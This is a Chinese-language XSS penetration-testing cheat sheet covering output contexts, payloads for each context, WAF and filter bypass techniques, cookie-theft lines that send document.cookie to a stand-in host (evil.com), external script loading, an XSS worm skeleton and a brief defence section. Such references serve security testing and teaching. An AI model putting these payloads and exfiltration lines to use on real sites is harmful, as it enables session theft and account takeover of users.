# Web 安全 - XSS 跨站脚本

> 来源: WooYun 漏洞库（7,532 XSS 案例）| 拆自 web-injection.md

## 二、XSS跨站脚本

### 2.1 漏洞本质

```
用户输入(数据) -> 未编码输出 -> 浏览器解析为代码 -> 脚本执行
```

**核心公式**：XSS = 信任边界突破 + 输出上下文混淆（数据在HTML/JS/CSS/URL中语义变化）

### 2.2 检测方法

#### 高危输出点

| 输出点 | 触发条件 | 典型场景 |
|-------|---------|---------|
| 用户昵称/签名 | 页面加载 | 个人主页、评论、好友列表 |
| 搜索框回显 | 搜索操作 | 搜索结果页 |
| 评论/留言 | 内容展示 | 论坛、博客、商品评价 |
| 文件名/描述 | 文件列表 | 网盘、相册 |
| 邮件正文/标题 | 打开邮件 | 邮箱系统 |
| 订单备注 | 后台查看 | 电商后台、工单系统 |

**隐蔽输出点**（易遗漏）：HTTP头(XFF/UA写入日志)、WAP提交PC展示、客户端昵称Web渲染、草稿箱/审核列表

#### 上下文快速判断

```
输出在 <script> 内？ -> JS上下文（检查引号类型）
输出在属性值中？    -> 属性上下文（检查属性类型）
输出在标签内容中？  -> HTML上下文（检查特殊标签textarea/title）
输出在URL中？       -> URL上下文（检查协议限制）
输出在CSS中？       -> CSS上下文（检查expression支持）
```

### 2.3 上下文Payload

#### HTML标签内容

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### HTML属性值

```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### JavaScript字符串

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### URL上下文

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2.4 WAF/过滤绕过技巧

#### 编码绕过

```html
<!-- HTML实体 -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
<!-- Base64 + data协议 -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- CSS编码(IE) -->
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

#### 标签/属性变形

```html
<ScRiPt>alert(1)</sCrIpT>              <!-- 大小写混淆 -->
<script/src=//xss.com/x.js>            <!-- 斜杠替代空格 -->
<img src=x onerror=alert(1)>           <!-- 无引号 -->
<scrscriptipt>alert(1)</scrscriptipt>  <!-- 双写绕过 -->
<scr\x00ipt>alert(1)</script>          <!-- 空字符绕过 -->
```

#### 替代事件处理器

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

#### WAF特定绕过

```html
.<script src=http://localhost/1.js>.    <!-- 安全宝：前后加点号 -->
<!--[if true]><img onerror=alert(1) src=--> <!-- 注释干扰 -->
```

#### 长度限制绕过

```html
<script src=//xss.pw/j>                <!-- 最短外部加载 -->
<!-- DOM拼接 -->
<script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
<!-- 字符串拼接绕过关键字 -->
<script>window['al'+'ert'](1)</script>
<!-- fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### HTTPOnly绕过

- Flash接口获取用户信息替代Cookie
- 转为CSRF方式：直接执行敏感操作（改密码、加管理员、读token）

### 2.5 利用链

#### Cookie窃取

```html
<script>new Image().src="https://evil.com/c?="+document.cookie</script>
<img src=x onerror="new Image().src='https://evil.com/c?='+document.cookie">
<script>fetch('https://evil.com/c?='+document.cookie)</script>
```

#### DOM XSS关键源与汇

**危险源**：`location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`

**危险汇**：`innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`

#### XSS蠕虫核心逻辑

```javascript
// 1.获取当前用户身份(cookie/token)
// 2.构造包含自身payload的内容
// 3.自动发布/分享（AJAX POST）
// 4.触发条件：查看/访问即传播
function worm(){
    jQuery.post("/api/post", {"content": "<自传播payload>"})
}
worm()
```

#### 组合利用模式

```
XSS + CSRF -> 获取Token执行管理操作
XSS + SQLi -> 盲打获取Cookie -> 后台注入
XSS -> 账号劫持 -> 权限提升 -> 蠕虫传播
XSS盲打(留言/工单/反馈) -> 获取后台管理员Cookie
```

### 2.6 防御措施

- **输出编码**（核心）：HTML上下文用HTML实体，JS上下文用JS编码，URL上下文用URL编码
- CSP策略限制脚本来源
- HTTPOnly保护Cookie
- 白名单输入验证（避免黑名单，总有遗漏）
- **常见失误**：只过滤script标签、只过滤小写、前端过滤可抓包绕过、单次过滤被双写绕过

---

